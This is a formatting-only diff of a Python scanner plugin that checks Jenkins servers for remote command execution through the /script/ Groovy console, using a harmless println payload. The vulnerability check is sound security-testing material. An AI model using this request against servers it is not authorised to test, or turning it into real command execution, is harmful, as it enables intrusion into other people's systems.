@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Jenkins_0002'  # 平台漏洞编号，留空
     name = 'Jenkins 远程命令执行漏洞'  # 漏洞名称
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Jenkins'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '072cf0c1-898e-4cf9-af41-3982ef607a88'
@@ -34,10 +36,10 @@ class Poc(ABPoc):
             hh = hackhttp.hackhttp()
             add_url = '/script/'
             url = self.target + add_url
-            payload ='script=println%28Jenkins%29&json=%7B%22script%22%3A+%22println%28Jenkins%29%22%2C+%22%22%3A+%22%22%7D'
-            code, head, res, errcode, _= hh.http(url, payload)
-            if code == 200 and  'class jenkins.model.Jenkins' in res:
-                #security_hole(url)
+            payload = 'script=println%28Jenkins%29&json=%7B%22script%22%3A+%22println%28Jenkins%29%22%2C+%22%22%3A+%22%22%7D'
+            code, head, res, errcode, _ = hh.http(url, payload)
+            if code == 200 and 'class jenkins.model.Jenkins' in res:
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
